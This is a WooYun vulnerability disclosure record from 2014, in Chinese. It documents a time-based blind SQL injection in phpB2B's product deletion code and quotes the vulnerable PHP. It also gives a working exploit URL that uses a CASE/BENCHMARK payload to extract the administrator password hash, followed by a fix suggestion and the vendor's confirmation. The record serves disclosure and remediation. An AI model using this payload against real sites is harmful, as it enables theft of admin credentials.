{"id": 56312, "wybug_id": "wooyun-2014-058236", "wybug_title": "PHPB2B延迟盲注可能导致获取管理员hash", "wybug_corp": "phpb2b.com", "wybug_author": "kk_skipper", "wybug_date": "2014-04-24 11:14", "wybug_open_date": "2014-07-23 18:44", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向公众公开  简要描述： phpB2B延迟盲注，可以获取管理员的hash值 详细说明：  测试版本：0415更新版测试权限：需要注册会员测试详细：product.php\n大概在69行时，判断$id为整形，后续有调用$_GET[‘id’]，执行删除操作，导致了sql注入。if (isset($_GET['do']) || isset($_GET['act'])) {\t$do = trim($_GET['do']);\t$action = null;\tif(isset($_GET['action'])) $action = trim($_GET['action']);\tif (isset($_GET['id'])) {\t\t$id = intval($_GET['id']);\t}.....\tif (($do == \"del\" || $_GET['act']==\"del\") && !empty($id)) {\t\t\t\t$res = $product->read(\"id\",$id);\t\tif($res){\t\t\tif(!$product->del($_GET['id'], $conditions)){\t\t\t\tflash();\t\t\t}\t\t}else {\t\t\tflash(\"data_not_exists\");;\t\t}\t}\t}\n跟着del\nfunction del($ids, $conditions = null, $table = null)\t{\t\t$del_id = $this->primaryKey;\t\t$tmp_ids = $condition = null;\t\tif (is_array($ids))\t\t{\t\t\t$tmp_ids = implode(\",\",$ids);\t\t\t$cond[] = \"{$del_id} IN ({$tmp_ids})\";\t\t\t$this->catchIds = serialize($ids);\t\t}\t\telse\t\t{\t\t\t$cond[] = \"{$del_id}=\".intval($ids);\t\t\t$this->catchIds = $ids;\t\t}\t\tif (!empty($table)) {\t\t\t$table_name = $this->table_prefix.$table;\t\t}else{\t\t\t$table_name = $this->getTable();\t\t}\t\tif(!empty($conditions)) {\t\t\tif(is_array($conditions)) {\t\t\t\t$tmp_where_cond = implode(\" AND \", $conditions);\t\t\t\t$cond[] = $tmp_where_cond;\t\t\t}\t\t\telse {\t\t\t\t$cond[] = $conditions;\t\t\t}\t\t}\t\t$this->setCondition($cond);\t\t$sql = \"DELETE FROM \".$table_name.$this->getCondition(); echo $sql;exit;\t\t$deleted = $this->dbstuff->Execute($sql);\t\tunset($this->condition);\t\treturn $deleted;\t}\n延迟注入exp：http://200.200.87.150:873/virtual-office/product.php?do=del&id[]=5) and 1=(CASE WHEN (select ascii(substring(userpass,1,1)) from pb_2cw_members limit 1)=49 THEN BENCHMARK(10000000,SHA1(123)) ELSE 2 END)%23post参数：id=123注意事项：盲注的时候，有个小小的局限，那么就是产品的数据库中product表内 id字段必须要有为1的，否则不行；所以在盲注的时候，最好需要删除不成功，sql语句做一些处理即可。   漏洞证明：  查看后台mysql日志，或页面响应时间，都可以得到证明：\n\n   修复方案：  id值对于传入的数组也要进行判断整形   版权声明：转载请注明来源 kk_skipper@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-04-24 11:19 厂商回复： 感谢关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-24 14:13 |    \t\tkk_skipper \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:8        | 123)\t\t \n  确认的真快...    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}